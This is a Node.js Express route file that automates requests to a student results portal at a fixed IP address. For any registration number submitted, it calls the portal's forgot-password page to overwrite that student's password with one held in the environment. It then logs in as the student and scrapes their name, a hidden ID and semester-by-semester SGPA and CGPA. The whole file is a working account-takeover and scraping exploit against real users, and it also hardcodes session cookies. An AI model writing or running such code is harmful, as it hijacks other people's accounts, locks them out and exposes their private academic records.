const axios = require("axios");
const qs = require("qs");
const cheerio = require("cheerio");
const dotenv = require("dotenv");
dotenv.config({ path: "./.env" });
const cgpamodel = require("./cgmodel");
let cookieenv = process.env.COOKIE;
const express = require("express");
const router = express.Router();

const solve3 = async (token, sem) => {
  let data = qs.stringify({
    ToolkitScriptManager1_HiddenField: "",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __VIEWSTATE: token,
    ddlSemester: sem,
    hfIdno: "16219",
    "btnimgShowResult.x": "15",
    "btnimgShowResult.y": "14",
    hdfidno: "",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/default.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: "ASP.NET_SessionId=500u5m55vrmnot45susehpij",
      Origin: "http://202.168.87.90",
      Referer: "http://202.168.87.90/StudentPortal/default.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const res3 = response.data;

    // Use cheerio to load the HTML response
    const $ = cheerio.load(res3);

    // Extract desired values using selectors
    let regnnumber = $("#txtRegno").text().trim();
    let name = $("#lblStudentName").text().trim();
    let cgpa = $("#lblCPI").text().trim();
    let sgpa = $("#lblSPI").text().trim();

    return { success: true, regnnumber, name, sem, cgpa ,sgpa };
  } catch (error) {
    console.error(error);
    return { success: false, message: "Error occurred" };
  }
};

const solve2 = async (regn) => {
  let config = {
    method: "get",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/default.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      Connection: "keep-alive",
      Cookie: cookieenv,
      Referer: "http://202.168.87.90/StudentPortal/Login.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
  };

  try {
    const response = await axios.request(config);
    const res = response.data;

    // Use a regular expression to find the __VIEWSTATE value
    const viewStateMatch = res.match(
      /<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)" \/>/
    );
    const secret = res.match(
      /<input type="hidden" name="hfIdno" id="hfIdno" value="([^"]+)" \/>/
    );

    if (viewStateMatch && viewStateMatch[1]) {
      let l, r;
      let results = [],semresults=[],name;
      if (regn.includes("2022")) (l = 3), (r = 4);
      else if (regn.includes("2021")) (l = 1), (r = 6);
      else if (regn.includes("2020")) (l = 1), (r = 8);
      else if (regn.includes("2023")) (l = 1), (r = 2);
      else (l = 1), (r = 8);
      for (let i = l; i <= r; i++) {
        let result = solve3(viewStateMatch[1], i);
        results.push(result);
      }
      const resolveddata = await Promise.all(results);
      resolveddata.forEach((resp) => {
        name = resp.name;
        semresults.push({"sem" : resp.sem ,"sgpa" : resp.sgpa, "cgpa" : resp.cgpa});
      });
      return {success : true , regn , name: resolveddata[0].name , secret : secret[1] , semresults}
    } else {
      return null;
    }
  } catch (error) {
    console.error(error);
    return null;
  }
};

const solve = async (regn) => {
  let data = qs.stringify({
    ToolkitScriptManager1_HiddenField:
      ";;AjaxControlToolkit, Version=3.0.20229.20843, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e:en-US:3b7d1b28-161f-426a-ab77-b345f2c428f5:e2e86ef9:1df13a87:8ccd9c1b",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __VIEWSTATE:
      "/wEPDwUKLTQyNTE2MDAwMQ8WAh4JaXBBZGRyZXNzBQ4xNTIuNTguMTMyLjE5NWRkXBXfk5yprzdMiWwWi+eD3Oh7yl0=",
    txt_username: regn,
    text_water_ClientState: "",
    txt_password: `${process.env.PASSWORD}`,
    Text_Water2_ClientState: "",
    btnSubmit: "Login",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/Login.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: cookieenv,
      Origin: "http://202.168.87.90",
      Referer: "http://202.168.87.90/StudentPortal/Login.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const res = response.data;
    if (!res.includes(regn))
      return { success: false, message: "Invalid Application Number", regn };
    let res2 = await solve2(regn);
    return res2;
  } catch (error) {
    console.error(error);
    return `Error occurred for ${regn}`;
  }
};

const solve0 = async (regn) => {
  let data = qs.stringify({
    ToolkitScriptManager1_HiddenField:
      ";;AjaxControlToolkit, Version=3.0.20229.20843, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e:en-US:3b7d1b28-161f-426a-ab77-b345f2c428f5:e2e86ef9:1df13a87:8ccd9c1b",
    __EVENTTARGET: "",
    __EVENTARGUMENT: "",
    __VIEWSTATE: "/wEPDwUJNDIwOTE3NTAyZGSRWbQpdbF06hyJ8kCsmQqJcpHxqg==",
    txt_username: regn,
    text_water_ClientState: "",
    txtnewpass: `${process.env.PASSWORD}`,
    TextBoxWatermarkExtender1_ClientState: "",
    txtConfirmpass: `${process.env.PASSWORD}`,
    TextBoxWatermarkExtender2_ClientState: "",
    btnSubmit: "Submit",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://202.168.87.90/StudentPortal/ForgetPassword.aspx",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-US,en;q=0.9,en-IN;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: "ASP.NET_SessionId=500u5m55vrmnot45susehpir",
      Origin: "http://202.168.87.90",
      Referer: "http://202.168.87.90/StudentPortal/ForgetPassword.aspx",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    const res = response.data;
    if (res.includes("Password Modified Successfully")) {
      let finalres = await solve(regn);
      return finalres;
    } else {
      return {success : false , message : `Invalid application number ${regn}`};
    }
  } catch (error) {
    console.error(error);
    return `Error occurred for ${regn}`;
  }
};

router.post("/getindividualresult", async (req, res) => {
  try {
    const { regn } = req.body;
    const pwd = await solve0(regn);
    res.send(pwd);
  } catch (e) {
    res.json({ success: false, message: "Internal Server Error" });
  }
});

module.exports = router;
